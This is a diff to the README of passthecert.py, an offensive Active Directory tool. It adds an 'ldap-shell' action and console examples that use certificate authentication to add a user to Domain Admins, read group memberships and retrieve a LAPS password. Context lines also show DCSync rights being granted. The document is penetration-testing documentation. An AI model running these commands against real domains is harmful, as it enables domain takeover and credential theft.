@@ -24,7 +24,7 @@ Usage
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 usage: passthecert.py [-h] [-debug] [-port {389,636}]
-                      [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami}]]
+                      [-action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami,ldap-shell}]]
                       [-target sAMAccountName] [-new-pass [Password]] [-elevate] [-baseDN DC=test,DC=local]
                       [-computer-group CN=Computers] [-domain test.local] [-domain-netbios NETBIOSNAME]
                       [-computer-name COMPUTER-NAME$] [-computer-pass password]
@@ -39,7 +39,7 @@ options:
   -port {389,636}       Destination port to connect to. LDAPS (via StartTLS) on 386 or LDAPS on 636.
 
 Action:
-  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami}]
+  -action [{add_computer,del_computer,modify_computer,read_rbcd,write_rbcd,remove_rbcd,flush_rbcd,modify_user,whoami,ldap-shell}]
 
 Manage User:
   -target             sAMaccountnames   sAMAccountName of user to target.
@@ -89,6 +89,7 @@ Actions
 
 * Misc
   * `whoami`: Return the user represented by the certificate
+  * `ldap-shell`: Authenticate with the certificate via Schannel against LDAP and spawn an interactive LDAP shell
 
 Examples
 --------
@@ -143,7 +144,7 @@ Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
 [*] Successfully changed kpayne password to: ZqIrfZdt02OIq5Ek0ZZPcQKRWKEMEOKB
 ```
 
-Elevate a user fpr DCSYNC
+Elevate a user for DCSYNC
 
 ```console
 $ python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -target user_sam -elevate
@@ -152,10 +153,44 @@ Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
 [*] Granted user 'user_sam' DCSYNC rights!
 ```
 
+Spawn an interactive LDAP shell and add a user to a specific domain group
+
+```console
+$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+# add_user_to_group user_sam "Domain Admins"
+Adding user: user_sam to group Domain Admins result: OK
+```
+
+*Note: The above example assumes that the domain account for which the certificate was issued, holds privileges to add users to the target domain group.*
+
+Spawn an interactive LDAP shell and retrieve all groups the user is a member of
+
+```console
+$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+# get_user_groups user_sam
+CN=Domain Admins,CN=Users,DC=plak,DC=local
+```
+
+Spawn an interactive LDAP shell and retrieve the LAPS password of a specific computer
+
+```console
+$ python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
+Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
+
+# get_laps_password SRV-MAIL$
+Found Computer DN: CN=SRV-MAIL,OU=Mail,OU=Standard,OU=Servers,DC=domain,DC=local
+LAPS Password: #x0i{S4UF%42x50
+```
+
+*Note: The above example assumes that the domain account for which the certificate was issued, holds privileges to read LAPS passwords in the domain.*
 
 Credits
 -------
 
 - [JaGoTu (@jagotu)](https://twitter.com/jagotu) for [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
 - [Remi Gascou (@podalirius_)](https://twitter.com/podalirius_) and [Charlie Bromberg (@_nwodtuhs)](https://twitter.com/_nwodtuhs) for [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py)
-* [Impacket](https://github.com/SecureAuthCorp/impacket) by [SecureAuth](https://www.secureauth.com/)
+- [Impacket](https://github.com/SecureAuthCorp/impacket) by [SecureAuth](https://www.secureauth.com/)
